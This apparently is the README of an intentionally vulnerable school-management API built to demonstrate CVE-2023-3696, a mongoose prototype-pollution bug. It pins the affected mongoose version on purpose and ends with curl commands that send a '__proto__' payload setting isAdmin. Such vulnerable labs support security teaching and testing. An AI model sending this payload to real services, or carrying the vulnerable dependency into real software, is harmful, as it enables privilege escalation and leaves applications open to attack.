# School Management Backend - CVE-2023-3696 Demo

## WARNING
This application intentionally uses **mongoose 7.3.3** which is vulnerable to **CVE-2023-3696 (Prototype Pollution)**.
**DO NOT USE IN PRODUCTION!**

## CVE-2023-3696
- **Type**: Prototype Pollution
- **Severity**: High (CVSS 7.5)
- **Affected**: mongoose < 7.3.4
- **Fixed in**: mongoose 7.3.4

## Setup

```bash
npm install
npm start
```

MongoDB must be running on `localhost:27017`

## API Endpoints

| Method | Endpoint | Description |
|--------|----------|-------------|
| GET | /api/students | Get all students |
| GET | /api/students/:id | Get student by ID |
| POST | /api/students | Create student |
| PUT | /api/students/:id | Update student (VULNERABLE) |
| DELETE | /api/students/:id | Delete student |
| POST | /api/students/:id/subjects | Add subjects |
| DELETE | /api/students/:id/subjects/:subject | Remove subject |
| PATCH | /api/students/bulk-update | Bulk update (VULNERABLE) |
| POST | /api/students/search | Search (VULNERABLE) |

## Exploit Example

```bash
# Create a student
curl -X POST http://localhost:3000/api/students \
  -H "Content-Type: application/json" \
  -d '{"name": "Test", "email": "test@test.com", "age": 18, "grade": "12"}'

# Exploit CVE-2023-3696 - Prototype Pollution
curl -X PUT http://localhost:3000/api/students/<student_id> \
  -H "Content-Type: application/json" \
  -d '{"__proto__": {"isAdmin": true}}'
```
